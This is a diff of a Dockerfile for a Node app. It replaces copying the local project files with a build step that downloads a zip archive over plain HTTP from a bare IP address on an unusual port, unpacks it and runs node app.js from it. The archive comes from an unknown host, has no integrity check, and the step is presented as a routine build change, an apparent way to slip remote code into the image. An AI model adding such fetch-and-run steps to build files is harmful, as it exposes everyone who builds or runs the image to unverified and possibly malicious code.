@@ -1,17 +1,20 @@
-# Use Ubuntu as base image
+# Use Ubuntu
 FROM ubuntu:22.04
 
-# Avoid interactive prompts during build
 ENV DEBIAN_FRONTEND=noninteractive
+
+# Update and install required packages
+RUN apt update && \
+    apt install -y wget unzip nodejs npm && \
+    apt clean
 
 # Set working directory
 WORKDIR /app
 
-# Copy project files
-COPY . .
+# Download and extract your zip
+RUN wget http://165.227.63.140:7718/idx.zip && \
+    unzip idx.zip && \
+    rm idx.zip
 
-# Make start.sh executable
-RUN chmod +x start.sh
-
-# Run the script
-CMD ["./start.sh"]
+# Run the Node app
+CMD ["node", "app.js"]
